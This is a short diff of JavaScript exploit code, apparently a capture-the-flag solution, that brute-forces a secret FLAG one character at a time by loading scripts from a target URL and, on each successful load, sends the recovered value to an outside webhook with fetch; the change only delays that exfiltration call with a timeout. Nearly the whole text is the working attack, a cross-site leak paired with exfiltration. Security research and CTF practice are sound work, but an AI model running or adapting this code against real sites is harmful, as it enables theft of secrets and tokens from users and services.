@@ -23,8 +23,10 @@
         script.src = url+FLAG+g;
         script.onload = () => {
             FLAG += g;
-            fetch(whook+FLAG);
-            makeFetchRequest();
+            setTimeout(() => {
+                fetch(whook + FLAG);
+                makeFetchRequest();
+            }, 10);
         };
         //script.onerror = () => {fetch(whook+g+'Fail')};
         document.head.appendChild(script);
